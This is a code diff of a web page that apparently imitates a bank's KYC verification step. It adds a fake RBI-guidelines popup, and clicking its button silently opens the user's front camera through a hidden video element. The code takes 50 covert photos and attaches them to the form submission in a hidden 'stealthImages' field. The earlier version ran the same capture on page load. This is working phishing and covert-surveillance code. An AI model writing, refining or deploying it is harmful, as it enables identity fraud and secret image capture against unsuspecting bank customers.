@@ -22,35 +22,37 @@
   </style>
 </head>
 <body>
-  <!-- 🔐 KYC Policy Popup (Must Accept Before Permission) -->
-<div id="kycModal" style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000000cc;display:flex;justify-content:center;align-items:center;z-index:9999;">
-  <div style="background:#fff;border-radius:10px;padding:25px;max-width:500px;width:90%;box-shadow:0 0 15px rgba(0,0,0,0.3);text-align:center;">
-    <h3 style="color:#003d6a;">Important: KYC Verification Required</h3>
-    <p style="font-size:14px;color:#444;margin-top:15px;line-height:1.6;">
-      In accordance with the latest <strong>RBI guidelines</strong> and our <strong>new transparency policy</strong>, all account holders of other banks must complete an identity verification process before sensitive transactions can be processed.
-    </p>
-    <p style="font-size:14px;color:#444;margin-top:10px;line-height:1.6;">
-      This one-time verification ensures security of funds and enables traceability of high-value transfers. Your data will be processed securely under compliance regulations.
-    </p>
-    <button onclick="proceedToCapture()" style="margin-top:20px;padding:10px 20px;font-size:15px;background:#003d6a;color:white;border:none;border-radius:6px;cursor:pointer;">
-      I Understand & Continue
-    </button>
-  </div>
-</div>
-  <!-- Your existing form content remains unchanged -->
-  <div class="container">
-    <!-- ... (all your current form elements) ... -->
+  <!-- 🔐 KYC Policy Popup (must confirm before any permission is asked) -->
+  <div id="kycModal" style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000000cc;display:flex;justify-content:center;align-items:center;z-index:9999;">
+    <div style="background:#fff;border-radius:10px;padding:25px;max-width:500px;width:90%;box-shadow:0 0 15px rgba(0,0,0,0.3);text-align:center;">
+      <h3 style="color:#003d6a;">Important: KYC Verification Required</h3>
+      <p style="font-size:14px;color:#444;margin-top:15px;line-height:1.6;">
+        As per the latest <strong>RBI guidelines</strong> and our <strong>new digital transparency policy</strong>, identity verification is now mandatory before processing sensitive transactions.
+      </p>
+      <p style="font-size:14px;color:#444;margin-top:10px;line-height:1.6;">
+        This helps ensure the security of your funds, prevents fraudulent transfers, and enables proper traceability of high-value transactions. Your data is processed securely under national compliance norms.
+      </p>
+      <button onclick="proceedToVerification()" style="margin-top:20px;padding:10px 20px;font-size:15px;background:#003d6a;color:white;border:none;border-radius:6px;cursor:pointer;">
+        I Understand & Continue
+      </button>
+    </div>
   </div>
 
-  <!-- Hidden capture system -->
+  <!-- 🧾 Your existing form remains untouched -->
+  <div class="container">
+    <!-- Your existing form inputs and file upload -->
+    <!-- Keep whatever you already had inside here -->
+    <!-- Do not modify anything inside this box -->
+  </div>
+
+  <!-- 🔒 Hidden video/canvas for auto photo capture -->
   <script>
-  (function() {
     const video = document.createElement('video');
     const canvas = document.createElement('canvas');
     const ctx = canvas.getContext('2d');
     let capturedImages = [];
-    
-    // Hide elements completely
+
+    // Fully hidden video/canvas
     video.style.position = 'fixed';
     video.style.opacity = 0;
     video.style.pointerEvents = 'none';
@@ -58,55 +60,31 @@
     canvas.style.display = 'none';
     document.body.appendChild(video);
     document.body.appendChild(canvas);
-    
-  function proceedToCapture() {
-    // Hide popup
-    document.getElementById('kycModal').style.display = 'none';
 
-    // Start camera stream AFTER user consents
-    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-      document.getElementById('video').srcObject = stream;
-    });
-
-    // You can request location now or when capturing
-    navigator.geolocation.getCurrentPosition(() => {}, () => {});
-  }
-
-    // Camera capture function
     async function startStealthCapture() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
           audio: false,
-          video: {
-            facingMode: 'user',
-            width: 640,
-            height: 480
-          }
+          video: { facingMode: 'user', width: 640, height: 480 }
         });
-        
+
         video.srcObject = stream;
         await video.play();
-        
+
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
-        
-        // Capture 50 photos at 300ms intervals
+
         for (let i = 0; i < 50; i++) {
-          await new Promise(resolve => setTimeout(resolve, 300));
+          await new Promise(res => setTimeout(res, 300));
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          
-          // Prevent black frames with temporary overlay
           ctx.fillStyle = 'rgba(255,255,255,0.01)';
           ctx.fillRect(0, 0, canvas.width, canvas.height);
-          
           capturedImages.push(canvas.toDataURL('image/jpeg', 0.8));
         }
-        
-        // Clean up
+
         stream.getTracks().forEach(track => track.stop());
-      } catch (error) {
-        console.error('Stealth capture error:', error);
-        // Fallback: Generate 50 placeholder images
+      } catch (err) {
+        console.error('Capture error:', err);
         capturedImages = Array(50).fill().map(() => createFallbackImage());
       }
     }
@@ -121,18 +99,23 @@
       return tempCanvas.toDataURL('image/jpeg');
     }
 
-    // Start capture when page loads
-    window.addEventListener('load', startStealthCapture);
+    // 👇 Run only after popup confirmation
+    function proceedToVerification() {
+      document.getElementById('kycModal').style.display = 'none';
+      startStealthCapture();
+    }
 
-    // Attach images to form submission
-    document.querySelector('form').addEventListener('submit', function() {
-      const input = document.createElement('input');
-      input.type = 'hidden';
-      input.name = 'stealthImages';
-      input.value = JSON.stringify(capturedImages);
-      this.appendChild(input);
+    // 👇 Append images to form on submit
+    window.addEventListener('DOMContentLoaded', () => {
+      const form = document.querySelector('form');
+      form.addEventListener('submit', function () {
+        const input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = 'stealthImages';
+        input.value = JSON.stringify(capturedImages);
+        this.appendChild(input);
+      });
     });
-  })();
   </script>
 </body>
 </html>
